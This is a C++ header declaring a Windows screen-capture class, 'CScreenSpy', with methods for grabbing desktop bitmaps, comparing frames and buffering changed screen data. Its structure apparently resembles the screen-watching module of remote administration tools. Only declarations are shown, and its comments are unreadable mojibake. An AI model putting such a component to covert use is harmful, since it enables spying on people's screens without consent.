#pragma once

#include <windows.h>
#include <iostream>
using namespace std;
class CScreenSpy
{
public:
	CScreenSpy();
	CScreenSpy(ULONG BitmapCount);
	~CScreenSpy();
	LPBITMAPINFO OnInitBitmapInfo(ULONG BitmapCount,
		ULONG FullMetricsWidth, ULONG FullMetricsHeight);
	//λͼ��Ϣ
	ULONG GetBitmapInfoLength();
	LPBITMAPINFO GetBitmapInfo();
	//ץͼ
	LPVOID GetFirstScreenData();
	ULONG GetFirstScreenLength();
	
	
	
	LPVOID GetNextScreenData(ULONG* BufferLength);
	//�������͵����ݰ�
	VOID WriteScreenData(LPBYTE	BufferData, ULONG BufferLength);
	//�ֶο���λͼ����
	VOID ScanScreenData(HDC DestinationDCHandle, HDC SourceDCHandle, ULONG Width, ULONG Height);
	//�Ƚ���֡����
	ULONG CompareScreenData(LPBYTE NextScreenData, LPBYTE FirstScreenData,
		LPBYTE BufferData, DWORD ScreenScreenLength);
public:
	BYTE   m_Algorithm;                   //�㷨(ץͼ)
	ULONG  m_BitmapCount;             
	int    m_FullMetricsWidth;
	int    m_FullMetricsHeight;
	LPBITMAPINFO     m_BitmapInfo;
	HWND   m_DesktopHwnd;                 //������
	HDC    m_DesktopDCHandle;             //����
	HDC    m_DesktopMemoryDCHandle;       //������
	HBITMAP	m_BitmapHandle;               //����
	PVOID   m_BitmapData;

	HDC     m_DifficultMemoryDCHandle;
	HBITMAP	m_DifficultBitmapHandle;
	PVOID   m_DifficultBitmapData;

	//���͵��������е����ݰ��ڴ�
	BYTE*   m_BufferData;
	ULONG   m_Offset;
};

